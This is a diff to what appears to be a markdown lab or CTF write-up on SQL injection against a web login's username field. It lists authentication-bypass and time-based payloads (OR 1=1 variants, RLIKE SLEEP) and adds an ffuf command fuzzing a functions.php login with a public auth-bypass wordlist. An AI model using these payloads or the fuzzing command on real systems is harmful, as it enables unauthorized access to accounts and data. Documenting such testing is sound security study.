@@ -141,8 +141,6 @@ Injection to `username` POST field:
 ||1=1;-- - //clearer
 ```
 
-
-
 * This works with space in between the items too:&#x20;
 
 ```sql
@@ -172,11 +170,21 @@ I found that the following payload to the username field works too:
 ' RLIKE SLEEP(3) -- - // clearer
 ```
 
-#### Further manual testing
+#### Further testing
 
-I found that the following payloads works too:
+Utilizing `ffuf`, I found that the following payloads works too:
 
 > Note: In MySQL, `#` is a comment
+
+> Wordlist from [https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth\_Bypass.txt](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt)
+
+{% code overflow="wrap" %}
+```sh
+$ ffuf -u http://<target>functions.php -w auth_wordlist.txt -X POST -d "username=FUZZ&password=1&function=login" -H "Content-Type: application/x-www-form-urlencoded"
+```
+{% endcode %}
+
+There should be some output(s) that returns a larger response size than the rest.  The `-fs` flag can be used to filter this.
 
 ```sql
 ' OR 'x'='x';-- -
